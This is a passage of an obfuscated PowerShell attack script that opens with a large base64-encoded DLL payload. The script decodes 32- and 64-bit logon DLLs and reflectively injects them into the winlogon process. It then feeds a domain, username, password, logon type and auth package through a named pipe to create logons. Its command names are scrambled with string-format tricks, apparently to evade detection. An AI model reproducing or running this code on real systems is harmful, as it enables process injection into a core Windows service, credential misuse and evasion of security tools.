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')
        [Byte[]]${Lo`gON`32biT} =   (&("{2}{1}{0}" -f 'le','aB','gEt-VarI') ('0KCl'+'ty')  -vAl)::("{1}{0}{2}{4}{3}" -f'romB','F','a','4String','se6').Invoke(${LOG`oN32`B`It_basE64})
        [Byte[]]${Lo`goN64`BIt} =  (&("{2}{1}{0}" -f'le','IaB','VaR')  ('0'+'kclTY')  -Va )::("{2}{3}{1}{0}" -f 'ng','se64Stri','F','romBa').Invoke(${loGon6`4BiT_`BAs`E64})
        &("{4}{7}{0}{3}{2}{1}{5}{6}" -f 'R','c','e','efl','Invok','tiv','ePEInjection','e-') -Bytes32 ${lOgON`3`2b`it} -Bytes64 ${l`O`GoN64bit} -ProcId ${W`iN`Lo`GonPro`CEsSid}


        
        [Byte[]]${do`m`AinB`YtES} =   (  &("{0}{1}"-f'vaRiAb','Le') ("{1}{0}"-f 'K','7m')  -vAlUEonl)::"u`NIcOde".("{1}{2}{0}" -f'ytes','Ge','tB').Invoke(${Do`maINN`A`Me})
        [Byte[]]${usE`RN`A`MebY`TES} =   (&("{2}{3}{1}{0}"-f 'LE','IAb','gET-V','aR')  ("{0}{1}"-f'7','mk')  -VAlU  )::"uN`iCOde".("{1}{0}" -f'tes','GetBy').Invoke(${uS`E`RNAmE})
        [Byte[]]${p`ASS`wor`dBYtes} =  (  &("{0}{1}"-f 'd','IR')  ('VaRI'+'abLe:7'+'MK'))."v`AlUE"::"uNIco`DE".("{0}{1}" -f'Get','Bytes').Invoke(${Pa`s`sWoRd})

        ${p`IPE}.("{4}{3}{2}{0}{5}{1}"-f'n','on','n','ForCo','Wait','ecti').Invoke()

        ${p`ipe}.("{0}{1}"-f 'Wr','ite').Invoke(${domA`IN`ByT`es}, 0, ${Dom`A`i`NByTeS}."c`OuNt")
        ${Pi`PE}.("{3}{2}{5}{1}{4}{0}" -f'rain','rPipe','i','Wa','D','tFo').Invoke()
        &("{3}{2}{1}{0}" -f 'rbose','-Ve','ite','Wr') ("{3}{2}{1}{0}" -f 'in','ma','ent do','S')
        ${pI`pe}.("{1}{0}" -f 'rite','W').Invoke(${UseRN`A`m`e`BYTES}, 0, ${U`SeRna`mEBY`TES}."cO`UNt")
        ${PI`Pe}.("{0}{1}{2}" -f'WaitFo','rPipeDra','in').Invoke()
        &("{0}{1}{2}"-f'Write-Ve','rbo','se') ("{1}{0}{3}{2}"-f 't usern','Sen','me','a')
        ${P`ipE}.("{1}{0}" -f'ite','Wr').Invoke(${p`AsSw`O`RdbyTeS}, 0, ${p`AsswOR`db`yTeS}."C`OuNt")
        ${P`ipe}.("{1}{4}{2}{3}{0}" -f'n','Wai','r','PipeDrai','tFo').Invoke()
        &("{0}{2}{1}" -f'Write','rbose','-Ve') ("{1}{3}{2}{0}"-f 'd','Se','wor','nt pass')
        ${Pi`PE}.("{1}{2}{0}"-f 'e','Write','Byt').Invoke(${LOgon`TYPeN`UM})
        ${pI`pE}.("{2}{0}{3}{1}"-f 'itF','ipeDrain','Wa','orP').Invoke()
        &("{0}{3}{1}{4}{2}" -f 'W','te-','ose','ri','Verb') ("{2}{0}{1}"-f't logonty','pe','Sen')
        ${pI`pe}.("{0}{1}{2}"-f 'Wr','it','eByte').Invoke(${aUThp`AcK`Ag`eNUm})
        ${PI`pe}.("{0}{2}{3}{1}"-f'Wa','ipeDrain','itFo','rP').Invoke()
        &("{2}{1}{3}{0}"-f 'e','te-V','Wri','erbos') ("{2}{3}{0}{1}" -f'ckag','e','Sent au','th pa')

        ${r`EtmesSA`gEsI`ZE} = 1024
        [Byte[]]${R`ETuRn`mEsSag`eb`Ytes} = &("{0}{2}{1}"-f'New','ct','-Obje') ("{1}{2}{0}" -f '[]','By','te') ${re`T`MeSSAGeS`iZe}
        ${r`Ea`Db`Ytes} = ${p`ipe}.("{0}{1}"-f'Re','ad').Invoke(${Re`TUrNmE`SS`AgEBYTeS}, 0, ${r`e`TMe`s`sAgesize})

        ${rEt`UrNM`e`S`SaGe} =   (&("{2}{1}{0}"-f'le','VARiaB','get-')  ("WdS"+"KF") )."vA`LuE"::"a`ScIi"."G`EtSTRinG"(${r`EtUrNMEs`sageb`YT`Es}, 0, ${rea`DbY`Tes})
        &("{2}{1}{0}{3}"-f 'e','rit','W','-Output') "DLL OUTPUT: $($ReturnMessage) "
    }
    finally
    {
        ${P`iPe}.("{0}{2}{1}" -f 'D','se','ispo').Invoke()
    }
}